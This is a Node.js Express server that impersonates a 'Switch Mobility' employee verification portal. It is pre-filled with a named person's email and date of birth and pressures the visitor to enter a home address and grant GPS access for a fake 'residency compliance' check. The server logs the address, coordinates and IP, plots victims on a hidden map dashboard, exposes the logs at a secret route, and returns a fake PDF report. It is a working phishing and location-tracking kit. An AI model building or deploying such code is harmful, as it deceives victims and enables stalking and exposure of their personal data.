const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = 4000;
const SECRET_PATH = "/sssss"; // JSON Download
const VIEW_PATH = "/viewss";   // Visual Dashboard
const LOG_FILE = path.join(__dirname, "logs.json");

app.use(bodyParser.json());

if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
}

function saveLog(entry) {
  try {
    const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
    logs.push(entry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
  } catch (err) {
    console.error("Error saving log:", err);
  }
}

// --- ROUTE 1: OFFICIAL SIMULATOR UI ---
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Switch Mobility | Employee Verification Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: #f0f2f5; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
        }
        .container { 
            background: white; 
            width: 100%; 
            max-width: 480px; 
            padding: 40px; 
            border-radius: 12px; 
            box-shadow: 0 8px 30px rgba(0,0,0,0.08); 
        }
        
        /* Header & Logo */
        .header { text-align: center; margin-bottom: 30px; }
        .logo { max-width: 180px; margin-bottom: 15px; }
        h2 { color: #111; font-size: 22px; margin: 0; font-weight: 700; }
        p.subtitle { color: #666; font-size: 14px; margin-top: 5px; }

        /* Form Sections */
        .section-title { 
            font-size: 12px; 
            text-transform: uppercase; 
            color: #888; 
            font-weight: 700; 
            margin-bottom: 10px; 
            letter-spacing: 0.5px; 
            border-bottom: 1px solid #eee;
            padding-bottom: 5px;
        }
        
        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 500; color: #333; margin-bottom: 5px; }
        
        input, textarea { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #ddd; 
            border-radius: 6px; 
            font-size: 14px; 
            box-sizing: border-box; 
            transition: border 0.2s;
            font-family: 'Inter', sans-serif;
        }
        
        /* Read Only Styling */
        input:read-only { 
            background-color: #f8f9fa; 
            color: #555; 
            border-color: #e9ecef; 
            cursor: not-allowed;
        }

        input:focus, textarea:focus { border-color: #0056b3; outline: none; }

        /* GPS Warning Box */
        .gps-box { 
            background-color: #e3f2fd; 
            border-left: 4px solid #2196f3; 
            padding: 12px; 
            margin: 20px 0; 
            font-size: 13px; 
            color: #0d47a1;
            line-height: 1.5;
        }

        /* Button */
        button { 
            width: 100%; 
            padding: 14px; 
            background-color: #0056b3; /* Switch Mobility Blue-ish tone */
            color: white; 
            border: none; 
            border-radius: 6px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            transition: background 0.2s; 
        }
        button:hover { background-color: #004494; }
        button:disabled { background-color: #ccc; cursor: default; }

        /* Messages */
        #statusMsg { margin-top: 15px; text-align: center; font-size: 14px; }
        .error { color: #d32f2f; font-weight: 500; }
        .success { color: #2e7d32; font-weight: 500; }

        textarea { resize: vertical; min-height: 80px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKlOTa6nQ9IBee3wQutYYddsDsiVMbGqXRhHaYG0Ax&s=10" alt="Switch Mobility" class="logo">
        <h2>Employee Verification</h2>
        <p class="subtitle">Official Work Customer Portal</p>
    </div>

    <div class="section-title">Employee Details (Read-Only)</div>
    
    <div class="form-group">
        <label>Full Name</label>
        <input type="text" id="name" value="Vasu Bawa" readonly>
    </div>
    
    <div class="form-group">
        <label>Email Address</label>
        <input type="text" id="email" value="Vasu.bawa@switchmobilityev.com" readonly>
    </div>

    <div class="form-group">
        <label>Date of Birth</label>
        <input type="text" id="dob" value="26/08/1993" readonly>
    </div>

    <div class="section-title" style="margin-top: 20px;">Current Location Details</div>

    <div class="form-group">
        <label>Current Residential Address</label>
        <textarea id="address" placeholder="Enter House No, Street, Locality..."></textarea>
    </div>

    <div class="form-group">
        <label>Postal Code / Zip Code</label>
        <input type="text" id="zipcode" placeholder="e.g. 122001">
    </div>

    <div class="gps-box">
        <strong>⚠️ GPS Authorization Required</strong><br>
        To complete the verification process, you must <strong>Allow</strong> browser location access when prompted. This is required for residency compliance.
    </div>

    <button id="submitBtn" onclick="handleSubmission()">Download Report and customer interaction feedback</button>
    <div id="statusMsg"></div>
</div>

<script>
    function handleSubmission() {
        const address = document.getElementById('address').value;
        const zip = document.getElementById('zipcode').value;
        const msg = document.getElementById('statusMsg');
        const btn = document.getElementById('submitBtn');

        // 1. Validate Inputs
        if (!address || !zip) {
            msg.className = 'error';
            msg.innerText = "Please enter your Address and Postal Code.";
            return;
        }

        // 2. Prepare UI for GPS Request
        msg.className = '';
        msg.innerText = "Requesting GPS... Check your browser popup.";
        btn.disabled = true;
        btn.innerText = "Waiting for Permission...";

        // 3. Request GPS
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                // SUCCESS: User Clicked "Allow"
                async (position) => {
                    msg.className = 'success';
                    msg.innerText = "Location Verified. Saving Data...";

                    const payload = {
                        name: document.getElementById('name').value,
                        email: document.getElementById('email').value,
                        dob: document.getElementById('dob').value,
                        address: address,
                        zipCode: zip,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };

                    try {
                        // Send data to backend
                        await fetch('/api/submit-verification', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });

                        // Trigger Download
                        window.location.href = "/download-report";
                        
                        btn.innerText = "Verification Complete";
                        msg.innerText = "Data Saved. Downloading Report...";
                    } catch (e) {
                        msg.className = 'error';
                        msg.innerText = "Server Error. Please try again.";
                        btn.disabled = false;
                    }
                },
                // ERROR: User Clicked "Block" or Error occurred
                (error) => {
                    console.error(error);
                    let errorText = "GPS Error.";
                    if (error.code === 1) {
                        errorText = "❌ You denied the GPS request. Verification failed.";
                    } else if (error.code === 2) {
                        errorText = "❌ GPS Unavailable. Check your device settings.";
                    } else if (error.code === 3) {
                        errorText = "❌ GPS Timeout.";
                    }
                    
                    msg.className = 'error';
                    msg.innerText = errorText;
                    btn.disabled = false;
                    btn.innerText = "Verify Location & Download Report";
                }
            );
        } else {
            msg.className = 'error';
            msg.innerText = "Geolocation not supported by this browser.";
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
  `);
});

app.post("/api/submit-verification", (req, res) => {
  const { name, email, dob, address, zipCode, latitude, longitude } = req.body;
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
  
  saveLog({
    timestamp: new Date().toLocaleString(),
    userData: { name, email, dob, address, zipCode },
    gps: { lat: latitude, lon: longitude },
    ip
  });
  res.json({ success: true });
});

// --- ROUTE 3: READABLE DATA VIEW WITH MAP (/viewss) ---
app.get(VIEW_PATH, (req, res) => {
  const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));

  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Switch Mobility | Admin Tracking</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; height: 100vh; background: #f4f4f4; }
        #sidebar { width: 400px; overflow-y: auto; background: white; border-right: 1px solid #ddd; padding: 20px; box-shadow: 2px 0 5px rgba(0,0,0,0.1); z-index: 1000; }
        #map { flex-grow: 1; z-index: 1; }
        .log-card { background: #fff; border: 1px solid #eee; border-radius: 8px; padding: 15px; margin-bottom: 15px; cursor: pointer; transition: 0.2s; border-left: 5px solid #0056b3; }
        .log-card:hover { background: #f0f7ff; transform: translateY(-2px); }
        .log-card h4 { margin: 0 0 5px 0; color: #0056b3; }
        .log-card p { margin: 3px 0; font-size: 13px; color: #555; }
        .header { margin-bottom: 20px; border-bottom: 2px solid #0056b3; padding-bottom: 10px; }
        .tag { font-size: 10px; background: #eee; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>

<div id="sidebar">
    <div class="header">
        <h3>Live Fleet Logs</h3>
        <p style="font-size: 12px; color: #888;">Switch Mobility Admin Portal</p>
    </div>
    <div id="logList"></div>
</div>

<div id="map"></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    const data = ${JSON.stringify(logs)};
    const map = L.map('map').setView([28.6139, 77.2090], 10); // Center on Delhi

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
    }).addTo(map);

    const logList = document.getElementById('logList');

    data.reverse().forEach((log, index) => {
        // Add Marker to Map
        const marker = L.marker([log.gps.lat, log.gps.lon]).addTo(map)
            .bindPopup(\`<b>\${log.userData.name}</b><br>\${log.userData.address}\`);

        // Add Card to Sidebar
        const card = document.createElement('div');
        card.className = 'log-card';
        card.innerHTML = \`
            <h4>\${log.userData.name} <span class="tag">VERIFIED</span></h4>
            <p><strong>Email:</strong> \${log.userData.email}</p>
            <p><strong>Address:</strong> \${log.userData.address}</p>
            <p><strong>Captured:</strong> \${log.timestamp}</p>
            <p style="font-size:11px; color:#999;">GPS: \${log.gps.lat.toFixed(4)}, \${log.gps.lon.toFixed(4)}</p>
        \`;
        
        card.onclick = () => {
            map.flyTo([log.gps.lat, log.gps.lon], 15);
            marker.openPopup();
        };
        
        logList.appendChild(card);
    });

    if(data.length > 0) {
        map.panTo([data[0].gps.lat, data[0].gps.lon]);
    }
</script>

</body>
</html>
  `);
});

// --- ROUTE 3: DOWNLOAD PDF ---
app.get("/download-report", (req, res) => {
  const dummyPdfContent = `
============================================================
   SWITCH MOBILITY - EMPLOYEE VERIFICATION REPORT
============================================================

Date: ${new Date().toLocaleDateString()}
Status: VERIFIED
Employee: Vasu Bawa
ID: SM-88201

LOCATION AUDIT:
------------------------------------------------------------
GPS Coordinates successfully captured and matched against
residential zoning requirements.

Result: PASSED

Welcome to the Switch Mobility Remote Fleet Program.
============================================================
  `;

  res.setHeader("Content-Type", "application/pdf");
  res.setHeader("Content-Disposition", "attachment; filename=Switch_Mobility_Verification.pdf");
  res.send(dummyPdfContent);
});

// --- ROUTE 4: SECRET LOGS ---
app.get(SECRET_PATH, (req, res) => {
  if (fs.existsSync(LOG_FILE)) {
    res.sendFile(LOG_FILE);
  } else {
    res.send("No logs yet.");
  }
});

app.listen(PORT, () => {
  console.log(`Switch Mobility Simulator running on http://localhost:${PORT}`);
});
